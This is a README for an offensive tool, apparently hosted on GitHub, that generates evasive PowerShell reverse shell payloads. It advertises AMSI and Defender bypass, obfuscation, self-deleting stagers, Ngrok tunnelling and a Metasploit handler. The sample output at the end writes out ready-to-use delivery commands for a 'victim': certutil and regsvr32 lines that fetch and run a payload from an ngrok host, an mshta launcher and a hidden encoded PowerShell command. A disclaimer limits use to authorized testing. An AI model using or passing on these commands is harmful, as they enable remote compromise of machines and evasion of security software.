# ultra-stealth-shell
# 🐉 Ultra Stealth Reverse Shell Generator

An advanced, automated reverse shell payload generator built for **authorized red teaming and ethical hacking** engagements.  
It delivers highly evasive PowerShell payloads using:

- 🔐 AMSI Bypass
- 🔁 Base64 Obfuscation
- 🎭 LOLBins (`mshta`, `certutil`, `regsvr32`)
- 🧨 Self-deleting script stagers
- 🚇 Ngrok tunnels for internet delivery
- 🎯 Integrated Metasploit handler

---

## ⚠️ DISCLAIMER

> 🔒 **This tool is for educational use and legal penetration testing only.**  
> 🚫 Unauthorized access to systems you don't own or have explicit permission to test is **illegal**.  
> 🧠 The author is not responsible for any damage or misuse.  
> 🛡️ Use it only in labs, CTFs, or client-approved red team ops.

---

## 📦 Features

| Feature                         | Description |
|----------------------------------|-------------|
| ✅ **Ngrok Integration**         | For NAT/firewall bypass |
| ✅ **MSF Payload Generator**     | Uses `msfvenom` & `msfconsole` |
| ✅ **AMSI & Defender Bypass**   | Using `$amsiInitFailed` |
| ✅ **PowerShell Base64 Launcher** | One-liner payload execution |
| ✅ **LOLBins Support**          | Execute with `mshta`, `certutil`, `regsvr32` |
| ✅ **Auto HTTP Payload Hosting** | Auto-hosts payload via Python web server |
| ✅ **Self-Destruct Payload**     | Deletes after execution |

---

## 🔧 Requirements

Install the following tools (most are pre-installed in Kali Linux):

| Tool            | Install Command                      |
|-----------------|--------------------------------------|
| Python 3        | `sudo apt install python3`           |
| Metasploit      | `sudo apt install metasploit-framework` |
| Ngrok           | [https://ngrok.com/download](https://ngrok.com/download) |
| curl            | `sudo apt install curl`              |

---

## 🔐 Ngrok Setup

1. Go to [https://dashboard.ngrok.com/signup](https://dashboard.ngrok.com/signup)
2. Create a free account and get your **auth token**
3. Authenticate Ngrok:


ngrok authtoken <your_ngrok_auth_token>

4. Test Ngrok:

ngrok tcp 4444

You should see something like:
tcp://0.tcp.ngrok.io:14233

Ngrok is now ready to be used by the script.

🚀 Usage
## 📦 Installation

```bash
git clone https://github.com/<your-username>/ultra-stealth-shell.git
cd ultra-stealth-shell
python3 ultra_stealth_shell.py
```
Output
```bash
[+] Payload selected: windows/meterpreter/reverse_https
[*] Starting Ngrok tunnel...
[+] Ngrok Forwarding: 0.tcp.ngrok.io:14233
[*] Creating stealth PowerShell payload...
[+] Saved stealth PowerShell payload as: payload.ps1

🎯 STEALTH PAYLOADS READY — DELIVER ONE OF THESE TO TARGET:
======================================================================
[🔥 ENV Trick] Save and run payload_launcher.bat on victim
[🔥 Direct PowerShell] powershell -nop -w hidden -enc <base64>
[🔥 mshta (LOLBIN)] mshta.exe "javascript:var sh=new ActiveXObject('WScript.Shell'); sh.Run('<powershell>');close()"
[🔥 certutil] certutil -urlcache -split -f http://0.tcp.ngrok.io:8000/payload.ps1 payload.ps1 && powershell -ExecutionPolicy Bypass -File payload.ps1
[🔥 regsvr32] regsvr32 /s /n /u /i:http://0.tcp.ngrok.io:8000/payload.ps1 scrobj.dll
======================================================================
[+] Hosted script at: http://0.tcp.ngrok.io:8000/payload.ps1
[*] Starting Metasploit handler...
```

